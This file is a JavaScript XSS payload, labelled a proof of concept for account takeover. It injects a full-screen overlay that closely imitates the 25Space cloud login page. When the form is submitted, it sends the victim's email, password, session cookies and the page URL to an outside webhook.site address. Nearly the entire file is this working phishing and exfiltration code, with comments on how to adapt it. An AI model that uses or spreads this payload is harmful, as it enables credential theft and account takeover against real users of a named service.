// Improved PoC script for ATO via XSS - Clones the EXACT 25Space login page look
// Dark theme, orange accents, background image, logo, real QR placeholder, orange SignIn button
// Exfiltrates email, password, cookies to your webhook
// Replace 'https://your-webhook.site/your-unique-url' with your actual webhook

function createExactLoginOverlay() {
  // Full screen overlay
  const overlay = document.createElement('div');
  overlay.style.position = 'fixed';
  overlay.style.top = '0';
  overlay.style.left = '0';
  overlay.style.width = '100vw';
  overlay.style.height = '100vh';
  overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
  overlay.style.backgroundImage = 'url("https://cloud.25space.com/assets/images/login-bg.jpg")'; // Approximate background - adjust if you find exact
  overlay.style.backgroundSize = 'cover';
  overlay.style.backgroundPosition = 'center';
  overlay.style.zIndex = '99999';
  overlay.style.display = 'flex';
  overlay.style.alignItems = 'center';
  overlay.style.justifyContent = 'center';
  overlay.style.color = '#fff';
  overlay.style.fontFamily = 'Arial, sans-serif';

  // Main container
  const container = document.createElement('div');
  container.style.display = 'flex';
  container.style.width = '90%';
  container.style.maxWidth = '1200px';
  container.style.height = '80vh';

  // Left side (greeting + QR)
  const left = document.createElement('div');
  left.style.flex = '1';
  left.style.display = 'flex';
  left.style.flexDirection = 'column';
  left.style.justifyContent = 'center';
  left.style.padding = '40px';

  const goodMorning = document.createElement('h1');
  goodMorning.textContent = 'Good morning!';
  goodMorning.style.fontSize = '48px';
  goodMorning.style.marginBottom = '20px';
  left.appendChild(goodMorning);

  const qrText = document.createElement('p');
  qrText.textContent = 'Use 25Space across any device on the go. Scan the QR code to continue on other devices.';
  qrText.style.fontSize = '18px';
  qrText.style.marginBottom = '30px';
  left.appendChild(qrText);

  // Real-looking QR code (you can replace with actual base64 or image URL if you have it)
  const qrImg = document.createElement('img');
  qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?data=https://cloud.25space.com&size=200x200'; // Example QR
  qrImg.alt = 'QR Code';
  qrImg.style.width = '200px';
  qrImg.style.height = '200px';
  qrImg.style.border = '5px solid white';
  left.appendChild(qrImg);

  // Right side (form)
  const right = document.createElement('div');
  right.style.flex = '1';
  right.style.display = 'flex';
  right.style.flexDirection = 'column';
  right.style.justifyContent = 'center';
  right.style.alignItems = 'center';
  right.style.backgroundColor = 'rgba(0, 0, 0, 0.6)';
  right.style.padding = '40px';
  right.style.borderRadius = '10px';

  // Logo
  const logo = document.createElement('img');
  logo.src = 'https://cloud.25space.com/assets/images/logo.png'; // Approximate - replace with exact if known, or use text
  logo.alt = '25Space Logo';
  logo.style.width = '80px';
  logo.style.marginBottom = '20px';
  if (!logo.src.includes('logo')) logo.textContent = '25Space'; // Fallback
  right.appendChild(logo);

  const title = document.createElement('h2');
  title.textContent = 'Cloud Management Suite.';
  title.style.marginBottom = '30px';
  title.style.fontSize = '24px';
  right.appendChild(title);

  // Form
  const form = document.createElement('form');
  form.style.width = '80%';

  const emailInput = document.createElement('input');
  emailInput.type = 'email';
  emailInput.placeholder = 'Email';
  emailInput.required = true;
  emailInput.style.width = '100%';
  emailInput.style.padding = '15px';
  emailInput.style.marginBottom = '20px';
  emailInput.style.backgroundColor = '#333';
  emailInput.style.border = 'none';
  emailInput.style.borderRadius = '5px';
  emailInput.style.color = '#fff';
  emailInput.style.fontSize = '16px';
  form.appendChild(emailInput);

  const passInput = document.createElement('input');
  passInput.type = 'password';
  passInput.placeholder = 'Password';
  passInput.required = true;
  passInput.style.width = '100%';
  passInput.style.padding = '15px';
  passInput.style.marginBottom = '20px';
  passInput.style.backgroundColor = '#333';
  passInput.style.border = 'none';
  passInput.style.borderRadius = '5px';
  passInput.style.color = '#fff';
  passInput.style.fontSize = '16px';
  form.appendChild(passInput);

  const remember = document.createElement('div');
  remember.style.display = 'flex';
  remember.style.justifyContent = 'space-between';
  remember.style.marginBottom = '30px';
  remember.style.fontSize = '14px';

  const rememberLabel = document.createElement('label');
  rememberLabel.innerHTML = '<input type="checkbox" style="margin-right:8px;"> Remember me';
  remember.appendChild(rememberLabel);

  const problemsLink = document.createElement('a');
  problemsLink.textContent = 'Problems with login?';
  problemsLink.href = '#';
  problemsLink.style.color = '#ffa500';
  problemsLink.style.textDecoration = 'none';
  remember.appendChild(problemsLink);

  form.appendChild(remember);

  const signinBtn = document.createElement('button');
  signinBtn.type = 'submit';
  signinBtn.textContent = 'SignIn';
  signinBtn.style.width = '100%';
  signinBtn.style.padding = '15px';
  signinBtn.style.backgroundColor = '#ffa500';
  signinBtn.style.color = '#000';
  signinBtn.style.fontWeight = 'bold';
  signinBtn.style.border = 'none';
  signinBtn.style.borderRadius = '30px';
  signinBtn.style.cursor = 'pointer';
  signinBtn.style.fontSize = '18px';
  form.appendChild(signinBtn);

  const createAccount = document.createElement('p');
  createAccount.innerHTML = 'Don\'t have an account? <a href="#" style="color:#ffa500;">Create an account</a>';
  createAccount.style.marginTop = '20px';
  createAccount.style.textAlign = 'center';
  form.appendChild(createAccount);

  right.appendChild(form);

  container.appendChild(left);
  container.appendChild(right);
  overlay.appendChild(container);
  document.body.appendChild(overlay);

  // Exfiltration on submit
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    const data = {
      email: emailInput.value,
      password: passInput.value,
      cookies: document.cookie,
      url: window.location.href
    };

    fetch('https://webhook.site/c47a99a0-d241-401a-888d-e44e31dbb274', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    // Optional: remove overlay after "login"
    setTimeout(() => overlay.remove(), 1000);
  });
}

// Run it
createExactLoginOverlay();
